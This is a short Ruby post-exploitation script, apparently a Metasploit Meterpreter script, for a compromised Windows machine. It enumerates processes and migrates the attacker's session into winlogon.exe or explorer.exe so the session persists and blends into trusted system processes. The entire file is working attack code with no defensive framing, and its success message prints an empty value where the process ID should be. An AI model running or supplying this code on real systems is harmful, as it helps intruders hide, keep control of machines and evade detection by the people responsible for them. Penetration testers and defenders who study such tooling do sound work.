# $Id$
# $Revision$
#


def attempt_migration(target_pid)
	begin
		print_good("Migrating to #{target_pid}")
		client.core.migrate(target_pid)
		print_good("Successfully migrated to process #{}")
		return true
	rescue ::Exception => e
		print_error("Could not migrate in to process.")
		print_error(e)
		return false
	end
end

if client.platform =~ /win32|win64/
	server = client.sys.process.open
	original_pid = server.pid
	print_status("Current server process: #{server.name} (#{server.pid})")

	uid = client.sys.config.getuid

	processes = client.sys.process.get_processes
	
	uid_explorer_procs = []
	explorer_procs = []
	winlogon_procs = []
	processes.each do |proc|
		uid_explorer_procs << proc if proc['name'] == "explorer.exe" and proc["user"] == uid
		explorer_procs << proc if proc['name'] == "explorer.exe" and proc["user"] != uid
		winlogon_procs << proc if proc['name'] == "winlogon.exe"
	end

	winlogon_procs.each { |proc| return if attempt_migration(proc['pid']) }
	uid_explorer_procs.each { |proc| return if attempt_migration(proc['pid']) }
	explorer_procs.each { |proc| return if attempt_migration(proc['pid']) }

	print_error "Was unable to sucessfully migrate into any of our likely candidates"

end
